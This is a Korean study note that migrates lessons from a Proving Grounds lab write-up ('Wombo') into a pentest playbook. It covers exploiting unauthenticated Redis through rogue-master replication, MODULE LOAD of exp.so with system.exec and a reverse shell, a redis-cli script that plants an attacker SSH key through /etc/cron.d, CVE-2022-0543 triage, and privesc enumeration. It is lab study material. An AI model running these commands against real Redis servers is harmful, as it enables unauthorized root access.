---
tags:
  - type/audit
  - platform/pg
manual_tags: true
manual_cves: true
---
# Wombo — `_PLAYBOOK` 이관 제안

출처 노트: `03. PG\Wombo.md` (개작 전 485행 · 백업 `03. PG\_backup\Wombo.md.bak`)
실측 출처: `~/PG/Wombo/` (mtime 2026-08-20 11:25~12:06) · 볼트 `파일보관\PG-Wombo-*.png`

⚠️ **번호는 비워 두었음.** 신규 항목의 절 번호는 `pg-line-manager` 가 충돌을 보고 배정할 것. 박스 노트에는 `[[_PLAYBOOK#…]]` 앵커를 걸지 않았고 요약 콜아웃에 앵커 없는 `[[_PLAYBOOK]]` 한 줄만 둠.

**이관 건수 12 · 노트에서 삭제한 원문 블록 12 — 1:1 대응.** 아래 각 항목의 「지우기 전 원문」이 검산 근거.

---

## 1. A. 증상별 — 「connect-back 이 어느 포트로도 안 잡힌다」

**어느 절** — 기존에 아웃바운드/egress 증상 절이 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> **증상** — 리버스셸·rogue 복제의 connect-back 이 tcpdump 에 하나도 안 잡힘.
>
> **하지 말 것** — 「아웃바운드가 통째로 막혔다」로 단정하고 다른 벡터로 넘어가는 것. Wombo 에서 실제로 이 오판을 했고 cron·authorized_keys 우회를 파느라 시간을 태움.
>
> **할 것** — 리스너/rogue master 를 **여러 포트로 번갈아 세우고 tcpdump 로 어느 포트에 SYN 이 오는지** 볼 것. 질문은 「아무 데도 안 오는가」가 아니라 **「어디로 오는가」**임.
>
> 의심 순서 세 계층:
> 1. **egress 포트 필터링** — 443·80 만 허용하는 경우가 흔함. [[Hawat]] 는 443, [[Wombo]] 는 80 이 성공 회선이었음
> 2. **인라인 블로킹/IPS** — 페이로드 시그니처로 끊는 경우
> 3. **바인드 실패(로컬 문제)** — 아래 「rogue master/리스너 bind 가 실패한다」 항목이 정확히 이것
>
> ⚠️ **「N번 포트만 허용」은 언제나 `[가정]` 이다.** 캡처는 *성공한* 회선만 보여줌 — 「시도조차 안 했다」와 「시도했으나 타겟 egress 에 막혀 SYN 이 오지 않았다」를 캡처만으로 구분할 수 없음. Wombo 에서 확실한 것은 성공 회선이 tcp/80 이라는 것뿐이고, 443 시도가 실재했다는 증거는 `run_rrs.sh` 의 `--lport 443` 한 줄임(그 실행 로그는 tmux `exec bash` 로 띄워 보존되지 않음).

**지우기 전 원문** (`Wombo.md` §6-① · §0 4번째 불릿 · §7-5)

```
### ① 아웃바운드가 tcp/80으로만 열려 있었다 — 이 박스의 전부

리버스셸과 rogue 복제를 443·8080·21000으로 시도했더니 **tcpdump에 connect-back SYN이 하나도 안 잡혔다.** 처음엔 "아웃바운드가 통째로 막혔다"로 오판했다. 실제로는 **타겟 방화벽이 tcp/80 아웃바운드만 허용**한다. rogue server를 `--lport 80`으로 올리자 즉시 붙었다(`verify_run.log`의 `SERVER 192.168.45.207:80` → `Loading module...` 성사).

진단의 정석: rogue master/리스너를 **여러 포트로 번갈아 세우고 tcpdump로 어느 포트에 SYN이 오는지** 본다. connect-back이 **한 포트에만** 오면 그게 허용된 egress다. "아무 데도 안 온다"가 아니라 "어디로 오는지"를 물어야 한다.

> [!tip] 아웃바운드가 막히면 의심 순서
> 1. **egress 포트 필터링** — 443·80만 허용하는 경우가 흔하다(HTTP/HTTPS로 위장한 C2를 막으려다 정상 트래픽만 남긴 형국). [[Hawat]]는 **443만** 허용이었고, 이 박스는 **80만** 허용이었다.
> 2. **인라인 블로킹/IPS** — 페이로드 시그니처로 끊는 경우.
> 3. **바인드 실패(로컬 문제)** — ②가 정확히 이것이었다.
> 이 세 계층을 분리하지 못하면 시간을 태운다.
```

```
- **아웃바운드가 막히면 무엇을 의심하나** — 이 박스의 진짜 싸움은 익스플로잇이 아니라 **egress 필터링**이었다. 타겟은 tcp/80으로만 나갈 수 있었다
```

```
5. **아웃바운드가 막히면 포트를 바꿔 tcpdump로 확인.** 이 박스는 :80만, [[Hawat]]는 :443만 허용이었다. **connect-back이 안 잡히면 "egress 전면 차단"으로 단정하지 말고 어느 포트가 열렸는지 스윕**하라.
```

---

## 2. A. 증상별 — 「rogue master/리스너가 안 뜬다 — bind 가 실패한다」

**어느 절** — 기존에 「실패 원인을 계층으로 분리하라」 계열 절이 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> **증상** — 익스플로잇 스크립트가 `OSError(98, 'Address already in use')` 로 죽음.
>
> **판정** — `errno 98` 은 **언제나 로컬**임. 원격 방화벽·egress 와 무관함. 직전 시도의 잔존 소켓이 TIME_WAIT 로 그 포트를 물고 있는 것.
>
> **할 것** — **같은 포트를 비우고(잔존 프로세스 `ss -lntp` 로 PID 특정 후 종료) 같은 포트로 재시도.** 포트를 바꾸는 것이 아님.
>
> Wombo 실측: 최초 :80 시도가 `errno 98` 로 실패 → 네트워크 실패로 오독 → 다른 포트를 헤맴. **최종 성공도 :80 이었음** — 즉 실패한 포트와 성공한 포트가 같음. 첫 시도(`exploit_run.log` 11:27:28)부터 플래그 회수(`flags.txt` 12:02:31)까지 **35분**이 걸렸고 그 대부분이 이 오독에서 파생됨.
>
> 에러가 나면 **어느 계층(로컬 소켓 / 라우팅 / 원격 방화벽 / 애플리케이션)에서 났는지**를 먼저 판정할 것. [[Squid]] 의 `certutil` 성공 배너 오독과 같은 계열.

**지우기 전 원문** (`Wombo.md` §6-② · §0 5번째 불릿 · §7-6)

```
### ② 가장 값진 교훈 — 첫 :80 실패는 네트워크가 아니라 로컬 소켓이었다

최초의 :80 시도가 실패했다(`exploit_run.log`):

```text
[info] SERVER 192.168.45.207:80
[info] Setting master...
[info] Setting dbfilename...
[err ] OSError(98, 'Address already in use')
```

이걸 **네트워크 실패로 읽고 다른 포트들을 헤맸다.** 하지만 `errno 98 Address already in use`는 **Kali 쪽에서 소켓 bind가 실패**한 것이다 — 직전 시도의 잔존 소켓이 TIME_WAIT로 :80을 물고 있었다. 네트워크는 멀쩡했다. **같은 포트를 비우고(잔존 프로세스 종료 후) 한 번 더 시도했어야** 했다.

> [!danger] 실패 원인을 계층으로 분리하라 — [[Squid]]와 같은 계열의 교훈
> [[Squid]]에서는 `certutil`이 성공 배너를 내면서도 파일을 못 썼다("성공 메시지를 믿지 말고 실제로 확인하라"). 여기서는 **에러 메시지의 계층을 오독**했다 — `Address already in use`는 원격 방화벽이 아니라 **로컬 bind** 계층의 문제다. 에러가 나면 **어느 계층(로컬 소켓 / 라우팅 / 원격 방화벽 / 애플리케이션)에서 났는지**를 먼저 판정하라. `errno 98`은 언제나 로컬이다.
```

```
- **실패 원인을 계층으로 분리하라** — 최초의 :80 시도 실패는 네트워크가 아니라 **Kali 쪽 소켓 잔존**이었다. 이걸 오독하면 시간을 태운다([[Squid]]의 certutil 교훈과 같은 계열)
```

```
6. **에러의 계층을 판정하라.** `errno 98 Address already in use`는 원격이 아니라 **로컬 bind** 실패다. 같은 포트를 비우고 재시도가 정답이었다.
```

⚠️ **본문에 반영할 정정**: 원문은 「rogue server를 `--lport 80`으로 올리자 즉시 붙었다」로 포트 변경을 성공의 원인처럼 서술하나, **실패한 :80 과 성공한 :80 은 같은 포트**임(`exploit_run.log` / `verify_run.log`). 위 본문은 그 점을 명시해 고쳐 적었음.

---

## 3. A. 증상별 — 「Redis → `/etc/cron.d` 가 안 돈다」

**어느 절** — 기존에 크론 기반 권한상승 실패 절이 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> **증상** — 무인증 Redis 로 `config set dir /etc/cron.d` → `dbfilename pwnjob` → cron 문법 문자열 `SET` → `SAVE` 까지 **Redis 응답은 전부 `OK`** 인데 크론이 돌지 않음.
>
> **원인 `[가정]`** — `SAVE` 가 쓰는 것은 RDB 파일임. 선두에 `REDIS0009…` 바이너리 헤더 줄이 붙고 말미에 `\xff` + CRC 푸터가 붙음. Debian cron 은 `/etc/cron.d` 파일에 파싱 불가능한 줄이 있으면 **파일 전체를 폐기**함 → 선두 바이너리 줄에서 걸려 우리 명령까지 통째로 버려짐. (Wombo 에서 크론 거부 로그를 직접 회수한 산출물은 없음 — 관측된 것은 「크론이 돌지 않았다」까지임.)
>
> **부수 함정** — 셸의 `$(...)` 명령치환이 **후행 개행을 먹음.** 그래서 RDB 푸터가 cron 명령 줄에 그대로 붙음. `plant_cron.sh` 가 `PRE`/`POST` 에 `$'\n\n'` 패딩을 준 이유. 이건 고쳐도 **선두 바이너리 줄이 여전히 파일을 죽임.**
>
> **읽기 채널 팁** — egress 가 막힌 상태에서 「크론이 돌았는가」를 확인하려면 **웹루트를 인바운드 채널로** 쓸 것. `plant_cron2.sh` 는 크론 명령 안에서 결과를 `/var/www/html/out.txt` · `/usr/share/nginx/html/out.txt` 로 복사하고 `chmod 644` 를 걸어, 공격자가 HTTP GET 으로 회수하도록 설계했음. 아웃바운드가 죽어도 인바운드는 살아 있음.
>
> **결론** — Debian 에서 Redis→cron.d 는 RDB 헤더 오염 때문에 불안정함. 모듈 로드 경로가 있으면 그쪽이 우선임.

**지우기 전 원문** (`Wombo.md` §6-③)

```
### ③ 막다른 길 A — `/etc/cron.d` 경로는 RDB 오염으로 사망

Redis→cron은 무인증 Redis의 고전적 권한상승/RCE 경로다: `config set dir /etc/cron.d` → `config set dbfilename pwnjob` → cron 문법 문자열을 SET → `save`. cron이 그 파일을 읽어 명령을 돌린다. 시도했다(`plant_cron.sh`·`plant_cron2.sh`).

**cron은 돌고 있었다**(pid 429). 그런데 실패했다. 원인 진단이 이 항목의 값어치다 — RDB를 웹루트에 써서 HTTP로 받아 **실제 바이트를 눈으로 확인**했다:

- RDB 덤프는 파일 선두에 **`REDIS0009...` 바이너리 헤더 줄**을 붙인다. Debian cron은 `/etc/cron.d` 파일을 파싱할 때 **파싱 불가능한 줄이 있으면 파일 전체를 버린다.** 선두 바이너리 줄에서 걸려 우리 cron 명령까지 통째로 폐기됐다.
- 부수 버그도 하나 잡았다: 셸의 `$(...)` 명령치환이 **후행 개행을 먹어**, RDB의 `\xff`+CRC 푸터가 cron 명령 줄에 그대로 붙어버렸다(`plant_cron.sh`의 `PRE`/`POST`에 `\n\n` 패딩을 준 이유). 이건 고쳤지만 — **선두 바이너리 줄이 여전히 파일을 죽인다.**

결론: **Debian에서 Redis→cron.d는 RDB 헤더 오염 때문에 불안정하다.** RDB 바디에 cron 문법을 넣어도 헤더/푸터 바이너리가 파일을 오염시킨다. (일부 배포판의 cron은 이 상황에서 유효한 줄만 취하기도 하나, **이 박스의 Debian 9 cron은 파일 전체를 버렸다** — 실측.)
```

⚠️ **원문에서 반증된 것 둘** — 위 본문은 이미 고쳐 적었음.
- 「RDB를 웹루트에 써서 HTTP로 받아 실제 바이트를 눈으로 확인했다」 → **산출물에 없음.** `plant_cron2.sh` 가 웹루트로 복사한 것은 RDB 가 아니라 **크론 명령의 실행 결과**(`/tmp/out.txt`)임. 즉 웹루트는 「바이트 확인용」이 아니라 **「크론이 돌았는지 확인하는 인바운드 회신 채널」**이었음
- 「cron은 돌고 있었다(pid 429)」 → 근거는 `writeup_notes.txt` 의 동시대 기록 한 줄뿐. `ps` 출력 원문은 미보존
- 「이 박스의 Debian 9 cron은 파일 전체를 버렸다 — 실측」 → **실측이 아님.** 크론 로그·거부 메시지 산출물 0건. 관측된 것은 「크론이 돌지 않았다」까지이고 원인은 `[가정]`

**참조 산출물** (`_PLAYBOOK` 본문에는 넣지 않아도 되나 검산용으로 남김)

```bash
# ~/PG/Wombo/plant_cron.sh 발췌
PRE=$'\n\n* * * * * root mkdir -p /root/.ssh && echo "'
POST=$'" > /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys\n\n'
VAL="$PRE$PUB$POST"

redis-cli -h $T -p $P config set dir /etc/cron.d
redis-cli -h $T -p $P config set dbfilename pwnjob
redis-cli -h $T -p $P set shell "$VAL"
redis-cli -h $T -p $P save
```

```text
=== planting ===
OK
OK
OK
OK
=== restoring redis config ===
OK
OK
dir
/
dbfilename
dump.rdb
```
— 출처: `~/PG/Wombo/plant_cron.log`

---

## 4. A. 증상별 — 「Redis → `authorized_keys` 트릭이 `CONFIG SET dir` 에서 막힌다」

**어느 절** — **신규**.

**넣을 본문**

> **증상** — `config set dir /root/.ssh` 가 다음을 냄:
>
> ```text
> ERR Changing directory: No such file or directory
> ```
> — 출처: `~/PG/Wombo/ssh_dir_check.txt` (타겟에 직접 친 실측)
>
> **원인** — `CONFIG SET dir` 는 내부적으로 `chdir()` 를 호출함. 대상 디렉터리가 없으면 `chdir` 이 실패하고 `dir` 는 바뀌지 않은 채 이전 값으로 남음(Wombo 에서는 `/`).
>
> **전제 조건** — 이 트릭은 ① 대상 `.ssh` 디렉터리가 **이미 존재**하고 ② Redis 가 그곳에 **쓸 권한**이 있어야 성립함. 디렉터리를 만들 수단이 없음 — 만들려면 이미 RCE 가 필요하니 순환임.
>
> **먼저 칠 것** — `config set dir <경로>` 를 **아무 페이로드도 준비하기 전에** 한 번 쳐서 경로 가용성부터 판정할 것. Wombo 에서는 SSH 키쌍을 먼저 생성하고(11:35) 크론 스크립트를 두 번 돌린 뒤(11:36·11:39) **11:50 에야** 이 확인을 했음 — 순서가 거꾸로여서 14분을 태움.
>
> **대체 대상** — `/root/.ssh` 가 없으면 `/home/<user>/.ssh` 가 있는 계정을 노림. Wombo 는 `/home` 이 비어 있어 그쪽도 없었음(단일 플래그 direct-to-root 박스라 저권한 계정 자체가 없음).

**지우기 전 원문** (`Wombo.md` §6-④)

```
### ④ 막다른 길 B — `authorized_keys` 트릭 불가 (`/root/.ssh` 부재)

두 번째 고전 경로: `config set dir /root/.ssh` → `dbfilename authorized_keys` → 우리 공개키를 SET → save → SSH 로그인. 하지만 타겟은 이 디렉터리가 없어 CONFIG SET에서 막혔다(`ssh_dir_check.txt`, **타겟에 직접 친 실측**):

```text
$ redis-cli -h 192.168.248.69 config set dir /root/.ssh
ERR Changing directory: No such file or directory
$ redis-cli -h 192.168.248.69 config get dir
dir
/
```

`config set dir`는 내부적으로 `chdir()`를 호출하는데, `/root/.ssh`가 존재하지 않아 `chdir`이 실패하고 위 에러를 낸다. `dir`는 바뀌지 않고 `/`로 남는다. 디렉터리 자체를 만들 수단이 없으니(그러려면 이미 RCE가 필요) 이 경로는 닫혔다.

> [!note] Redis→SSH 키 경로의 전제 조건
> 이 트릭은 **대상 `.ssh` 디렉터리가 이미 존재**하고 **Redis가 그곳에 쓸 권한**이 있어야 성립한다. `/home/<user>/.ssh`가 있는 사용자를 노리는 게 보통이지만, 이 박스는 root 외 사용자 홈이 없고 `/root/.ssh`도 미생성이라 원천 봉쇄됐다.
```

⚠️ **원문에서 반증된 것** — 인용 블록의 `$ redis-cli …` 프롬프트는 **산출물에 없음.** `ssh_dir_check.txt` 실제 내용은 아래 4줄이 전부이고 프롬프트 줄이 없음:

```text
===== RE-VERIFY /root/.ssh (coordinator asked) =====
ERR Changing directory: No such file or directory

dir
/
```

---

## 5. A. 증상별 — 「Redis Lua(`EVAL`) 샌드박스 탈출(CVE-2022-0543)이 안 통한다」

**어느 절** — **신규**.

**넣을 본문**

> **증상** — 무인증 Redis 인데 `EVAL` 로 `package.loadlib` 에 도달하려다 `package`·`os` 가 `nil` 로 나옴.
>
> **판정 근거는 «실행 파일 경로» 하나로 갈림.** `INFO server` 의 `executable:` 를 볼 것:
> - `/usr/bin/redis-server` (또는 배포판 패키지 경로) → **CVE-2022-0543 후보.** 이 결함의 원인은 Redis 상류가 아니라 **Debian/Ubuntu 패키징이 추가한 Lua 라이브러리 노출**임
> - `/usr/local/bin/redis-server` → **소스 컴파일본. 미적용.** 상류 Redis 의 Lua 는 `package`·`os` 가 정상 샌드박싱됨
>
> Wombo 는 후자(`executable:/usr/local/bin/redis-server`, `gcc_version:6.3.0`)라 이 경로가 애초에 없었음. **CVE 번호를 보기 전에 `executable:` 부터 볼 것** — 열거 3초로 시도 전체를 배제함.
>
> ⚠️ **Kali 로컬로 타겟 동작을 흉내 내지 말 것.** Kali 의 `redis-server`/`redis-cli` 는 **8.0.4**(2026-08 기준)라 `MODULE LOAD`·`CONFIG SET dir`·`EVAL` 의 에러 문구가 5.x 와 다름 — 8.x 는 `enable-module-command` 같은 신규 가드를 냄. 타겟 고유 동작은 **타겟에 직접 친 출력**으로만 인용할 것.

**지우기 전 원문** (`Wombo.md` §6-⑤ · §1-3 마지막 줄)

```
### ⑤ 막다른 길 C — CVE-2022-0543 (Lua 샌드박스 탈출) 미적용

또 하나의 후보는 CVE-2022-0543 — Debian/Ubuntu **패키지판** Redis가 Lua 인터프리터를 불완전하게 샌드박싱해 `EVAL`에서 `package.loadlib`로 시스템 함수에 도달하는 결함이다. 시도할 이유가 있었지만 이 박스엔 적용되지 않는다:

- 이 Redis는 **소스 컴파일본** `/usr/local/bin/redis-server`다(1-3의 `executable:` 확인). CVE-2022-0543은 **데비안 패키징이 추가한 Lua 라이브러리 노출**이 원인이라, 소스 컴파일본에는 그 취약 경로가 없다.
- 소스 컴파일 Redis의 Lua는 `package`·`os`가 **nil로 제대로 샌드박싱**돼 있어 `EVAL`에서 시스템 접근이 차단된다.

> [!warning] Kali 로컬로 타겟 동작을 흉내 내지 마라 — 버전이 다르다
> Kali의 `redis-server`는 **8.0.4**라 `MODULE LOAD`·`CONFIG SET dir`·`EVAL package` 모두 타겟(5.0.9)과 **에러 문구가 다르다**(8.x는 `enable-module-command`·`protected config` 같은 신규 가드를 낸다). 그래서 이 노트는 타겟 고유 동작을 **타겟에 직접 친 출력**(`ssh_dir_check.txt` 등)으로만 인용한다. CVE-2022-0543의 "package/os가 nil"은 소스 컴파일 Redis의 일반 성질로 서술했고, 타겟의 Lua 출력을 코드펜스로 위조하지 않았다.
```

```
`executable:/usr/local/bin/redis-server`가 **소스 컴파일본**이라는 사실은 뒤(6장)에서 CVE-2022-0543을 배제하는 근거가 된다 — 미리 눈여겨 둔다.
```

⚠️ **유보 유지** — 타겟에서 `EVAL` 로 `package`·`os` 가 `nil` 임을 확인했다는 근거는 `writeup_notes.txt` 의 동시대 기록 한 줄뿐이고 **EVAL 출력 원문은 미보존.** 위 본문은 그 사실을 「소스 컴파일본의 일반 성질」로만 서술하고 타겟 출력을 인용하지 않았음. (Kali 8.0.4 확인은 노트 개작 시점에 `redis-server --version` 으로 재실측함 — `Redis server v=8.0.4`.)

---

## 6. A. 증상별 — 「익스플로잇 스크립트가 예외로 죽는다」

**어느 절** — 기존에 「도구 출력이 성공을 뜻하지 않는다」 계열 절이 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> **증상** — PoC 스크립트가 성공 직후 스택트레이스를 뱉고 죽음. 실패로 보임.
>
> **판정** — **스크립트 크래시 ≠ 익스플로잇 실패.** 로그의 **어느 단계까지 갔는지**와 **타겟 측 상태**로 판정할 것.
>
> Wombo 실측(`verify_run.log`): `Loading module...` 이 찍힌 **뒤에** 죽음.
>
> ```text
> [info] Setting master...
> [info] Setting dbfilename...
> [info] Loading module...
> [info] Temerory cleaning up...
> [err ] UnicodeDecodeError('gb18030', b'$300\r\n...', 16, 17, 'illegal multibyte sequence')
> ```
>
> `redis-rogue-server.py` 의 `din()` 이 소켓 응답을 `.decode('gb18030')` 로 풀려다 RDB 바이너리에서 죽는 것 — **모듈은 이미 심겨 있음.** 결과로 판정:
>
> ```text
> $ redis-cli -h <타겟> module list
> name
> system
> ver
> 1
> ```
>
> 그다음은 스크립트의 대화형 셸에 기대지 말고 `redis-cli … system.exec` 로 **모듈을 직접 몰 것.**
>
> **일반화** — 국산/중문 PoC 는 하드코딩된 인코딩(`gb18030`·`gbk`)으로 바이너리 응답을 디코드하다 죽는 경우가 흔함. 크래시 지점이 **페이로드 전달 이후**면 타겟 상태부터 확인할 것.

**지우기 전 원문** (`Wombo.md` §0 6번째 불릿 · §3-1 크래시 서술)

```
- **스크립트 크래시 ≠ 익스플로잇 실패** — `redis-rogue-server.py`는 모듈을 심은 **뒤에** 죽는다. 결과(`module list`)로 성공을 판정하라
```

```
`din()`이 소켓 응답을 `.decode('gb18030')`로 풀려다 RDB 바이너리에서 죽는 것이다. **크래시는 무시하고 결과로 판정**한다(`module_list.txt`):
```

---

## 7. A. 증상별 — 「익스플로잇 바이너리가 타겟 glibc 에서 안 돌 것 같다」

**어느 절** — **신규**.

**넣을 본문**

> **증상** — 최신 Kali(glibc 2.35+)에서 빌드한 `.so`/ELF 를 낡은 타겟(Debian 9, glibc 2.24)에 심으려니 심볼 불일치가 걱정됨.
>
> **추측하지 말고 심볼 버전을 확인할 것:**
>
> ```bash
> objdump -T <파일> | grep -o 'GLIBC_[0-9.]*' | sort -u
> ```
>
> **정적 링크가 아닌 이상 «요구 심볼의 최소 버전»만 타겟 glibc 이하면 그대로 로드됨.**
>
> Wombo 실측 — 재빌드본과 저장소 prebuilt 둘 다 통과:
>
> | 파일 | 요구 심볼 |
> |---|---|
> | 재빌드 `exp.so` | `GLIBC_2.2.5` |
> | prebuilt `exp.so.prebuilt.bak` | `GLIBC_2.2.5` · `GLIBC_2.4` |
>
> 둘 다 Debian 9 의 2.24 이하 → **glibc 는 애초에 문제가 아니었음.**
>
> **실제로 필요했던 것은 glibc 대응이 아니라 «현대 gcc 대응»이었음** — `arpa/inet.h`·`string.h` 인클루드 누락(구 코드가 암시적 선언에 의존)과 `-Wall`→`-w` 로 `-Werror` 완화. 빌드가 안 되는 것과 타겟에서 안 도는 것을 섞지 말 것.

**지우기 전 원문** (`Wombo.md` §6-⑥)

```
### ⑥ 오진 — glibc 2.24 불일치 의심은 틀렸다

처음에 "`exp.so`가 최신 Kali(glibc 2.35+)에서 빌드됐으니 Debian 9(glibc 2.24)에서 심볼 불일치로 로드 실패할 것"이라 의심했다. **틀렸다.** `objdump -T exp.so`가 요구 심볼로 **`GLIBC_2.2.5` 하나만** 보였다(3-1). 이 모듈이 쓰는 함수(`popen`·`socket`·`dup2`·`execve`·`strcat`)는 전부 glibc 초기부터 있던 심볼이라 최신 버전 심볼을 끌어오지 않는다. Debian 9는 2.24 ≥ 2.2.5이므로 **그대로 로드된다.**

> [!tip] 오진도 기록 가치가 있다
> 빌드 시 실제로 필요했던 건 glibc 대응이 **아니라** 현대 gcc 대응이었다 — `arpa/inet.h`·`string.h` 인클루드 누락(구 코드가 암시적 선언에 의존)과 `-Wall`→`-w`로 `-Werror` 완화(3-1). **"glibc 불일치"라는 그럴듯한 가설을 `objdump` 한 줄이 반증**했다. 크로스 빌드 호환성은 **추측하지 말고 심볼 버전을 확인**하라 — 정적 링크가 아닌 이상 요구 심볼의 최소 버전만 맞으면 된다.
```

⚠️ **보강한 것** — 원문은 재빌드본만 확인했음. 개작 시점에 저장소 prebuilt 도 재조회해 `GLIBC_2.2.5`·`GLIBC_2.4` 를 확인했고, **그것도 2.24 이하**라 재빌드가 성공의 원인이었다는 증거가 없음을 확정함.

---

## 8. B. 기법 카드 — 「무인증 Redis = 임의 파일 쓰기 = RCE」

**어느 절** — 기존에 Redis 카드가 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> **신호** — `6379/tcp open redis`. 반사적으로 이 경로를 떠올릴 것.
>
> **첫 3개 명령이 익스플로잇 가능 여부를 그 자리에서 판정함:**
>
> ```bash
> redis-cli -h <타겟> INFO server        # 버전 · executable 경로
> redis-cli -h <타겟> MODULE LIST        # 비어 있으면 MODULE 이 rename 안 됨
> redis-cli -h <타겟> CONFIG GET dir     # 응답하면 CONFIG 가 rename 안 됨
> redis-cli -h <타겟> INFO replication   # role:master 면 SLAVEOF 가능
> ```
>
> **메커니즘 — 세 이야기를 분리해서 볼 것.**
>
> ① **복제가 임의 파일 쓰기다.** 슬레이브가 `SLAVEOF <master> <port>` 로 붙으면, 최초 동기화(full resync)에서 마스터가 데이터셋 전체를 RDB 스냅샷 하나로 직렬화해 보내고, 슬레이브는 받은 바이트를 **자신의 `dir`/`dbfilename` 경로에 파일로 기록**한 뒤 로드함. 가짜 마스터(rogue master)를 세우면 그 바이트를 우리가 정함:
>
> ```text
> victim>  SLAVEOF <우리IP> <포트>            # 타겟을 우리 rogue master 의 슬레이브로
> victim>  CONFIG SET dbfilename exp.so       # 받은 RDB 를 exp.so 라는 이름으로
> victim>  CONFIG SET dir /some/writable/path # 어느 디렉터리에
> ```
>
> RDB 앞뒤에 헤더/푸터 바이트가 붙어 결과 파일은 **RDB 껍데기로 감싼 `.so`** 이지만, ELF 로더는 파일 선두의 ELF 매직만 보므로 모듈로는 정상 동작함. (같은 헤더/푸터가 cron.d 경로는 죽임 — 「Redis → `/etc/cron.d` 가 안 돈다」 항목.)
>
> ② **`MODULE LOAD` 는 설계상 RCE 다.** Redis 4.0+ 의 모듈 API 가 `.so` 를 `dlopen` 하고 `RedisModule_OnLoad` 를 호출함. `n0b0dyCN/redis-rogue-server` 의 `exp.so` 는 `system.exec`(`popen`)·`system.rev`(리버스셸) 두 커맨드를 등록함.
>
> ③ **권한은 «모듈»이 아니라 «Redis 구동 계정»에서 옴.** `popen` 이 만드는 `/bin/sh` 는 redis-server 의 자식이라 부모 uid 를 상속함. Redis 가 root 면 즉시 root, `redis` 계정이면 그때부터 표준 리눅스 권한상승 열거가 시작됨. **「모듈 로드 = root RCE」는 오독임.**
>
> **변형 — 원리는 같고 막히는 지점만 다름:**
> - Redis 가 **저권한 계정**으로 구동 → foothold 후 별도 권한상승 필요. `sudo -l` · `find / -perm -4000 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.d` · 커널 익스플로잇 순
> - `[가정]` 저권한이어도 `config set dir` 로 쓸 수 있는 root 소유 경로(예: root cron 이 처리하는 웹루트)가 있으면 우회 가능
> - `authorized_keys` 쓰기가 통하는 경우 / cron 경로가 통하는 경우 — 각각 별도 A 항목 참조
>
> **`rename-command` 로 막는 법**(방어): `CONFIG` · `MODULE` · `SLAVEOF` 셋 중 하나만 지워도 이 경로 전체가 닫힘.

**지우기 전 원문** (`Wombo.md` §0 불릿 1~3 · §0 `[!tip]` 시험 출제 가능성 · §4 `[가정]` 2건)

```
## 0. 이 박스에서 배우는 것

- **무인증 Redis = 임의 파일 쓰기 = RCE** — 이 등식이 어떻게 성립하는지, 복제(replication) 프로토콜 수준에서 정확히 설명한다. "6379가 열려 있다"를 보면 반사적으로 이 경로를 떠올려야 한다
- **Redis 4/5의 `MODULE LOAD`는 설계상 RCE다** — 모듈 API가 임의 `.so`를 `dlopen`하기 때문이고, `system.exec`/`system.rev`는 그 모듈이 등록하는 커맨드다
- **왜 root인가 — Redis가 root로 돌기 때문이지 모듈 때문이 아니다** — 인과를 정확히 하는 훈련
```

```
> [!tip] 시험 출제 가능성 — **높다**
> 무인증 Redis는 OSCP·실무 양쪽에서 흔한 초기 침투 벡터다. 변형은 이런 모습이다 — Redis가 **저권한 계정**으로 돌아 foothold 후 별도 권한상승이 필요한 경우, `authorized_keys` 쓰기가 통하는 경우(이 박스는 `/root/.ssh` 부재로 불가), cron 경로가 통하는 경우. **핵심 원리(복제→파일쓰기→모듈로드)는 동일**하고, 막히는 지점만 박스마다 다르다. 이 노트의 6장이 그 "막히는 지점" 카탈로그다.
```

```
- `[가정]` Redis가 `redis` 유저로 돌았다면 foothold는 uid=redis. 그다음 표준 리눅스 권한상승 열거로 넘어간다: `sudo -l`, SUID 바이너리(`find / -perm -4000 2>/dev/null`), capabilities(`getcap -r / 2>/dev/null`), 쓰기 가능한 cron(`cat /etc/crontab; ls -la /etc/cron.d`), 커널 익스플로잇(Debian 9 / kernel 4.9는 오래됐으므로 후보가 있다).
- `[가정]` `redis` 유저라도 `config set dir`로 쓸 수 있는 root 소유 경로(예: 웹루트를 특정 서비스가 root cron으로 처리)가 있으면 그쪽으로 우회 가능. 이 박스에서 cron/authorized_keys 경로가 왜 막혔는지는 6장에서 다룬다.
```

(복제 메커니즘 원문 §2-2 · 모듈 메커니즘 원문 §2-3 · 페이로드 순서 원문 §2-5 는 **노트에 축약해 남겼음** — `Vulnerability Explanation:` 과 `Initial Access` 재현 절. 위 카드는 그것을 박스 무관 형태로 승격한 것이라 **삭제분이 아니라 중복 서술임.**)

---

## 9. D. 반사 체크리스트 — 「셸을 잡자마자 칠 명령 5개」

**어느 절** — 기존에 리눅스 권한상승 초기 열거 체크리스트가 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> `id` · `sudo -l` · `find / -perm -4000 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.d`
>
> 권한상승이 필요 없는 박스라도 습관으로 칠 것. [[Wombo]] 는 첫 명령 `id` 에서 이미 `uid=0` 이 떠 나머지가 불필요했으나, 저권한으로 떨어지는 변형에서는 이 반사가 시간을 아낌.

**지우기 전 원문** (`Wombo.md` §4 `[!tip]`)

```
> [!tip] 셸을 잡자마자 칠 명령 5개 (권한상승 없는 박스라도 습관으로)
> `id` · `sudo -l` · `find / -perm -4000 2>/dev/null` · `getcap -r / 2>/dev/null` · `cat /etc/crontab; ls -la /etc/cron.d`
> 이 박스는 첫 명령 `id`에서 이미 `uid=0`이 떠 나머지가 불필요했지만, 저권한으로 떨어지는 변형에서는 이 반사가 시간을 아낀다.

```

---

## 10. C. 시험 관점 — 「Redis PoC 와 Metasploit 카드 관리」

**어느 절** — 기존에 도구 허용/금지 판정 절이 있으면 **병합**, 없으면 **신규**.

**넣을 본문**

> - **`redis-rogue-server.py` 는 허용.** OSCP 금지 정의는 「**스스로 취약점을 발견해** 자동 익스플로잇하는」 도구임. 이건 단일 취약점(Redis 모듈 로드 RCE) PoC 라 발견 단계가 없음 — exploit-db/GitHub PoC 와 같은 지위
